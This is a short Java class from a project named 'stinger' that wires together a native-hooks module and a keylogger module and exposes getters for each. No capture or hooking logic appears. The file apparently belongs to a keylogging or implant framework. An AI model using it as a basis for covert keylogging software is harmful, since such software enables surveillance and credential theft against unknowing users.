package stinger;

import stinger.os.keylogger.KeyloggerModule;
import stinger.os.nhooks.NativeHooksModule;

public class StingerModuleImpl implements StingerModules {

    private final NativeHooksModule mNativeHooksModule;
    private final KeyloggerModule mKeyloggerModule;

    public StingerModuleImpl(NativeHooksModule nativeHooksModule, KeyloggerModule keyloggerModule) {
        mNativeHooksModule = nativeHooksModule;
        mKeyloggerModule = keyloggerModule;
    }

    @Override
    public NativeHooksModule getNativeHooks() {
        return mNativeHooksModule;
    }

    @Override
    public KeyloggerModule getKeylogger() {
        return mKeyloggerModule;
    }
}
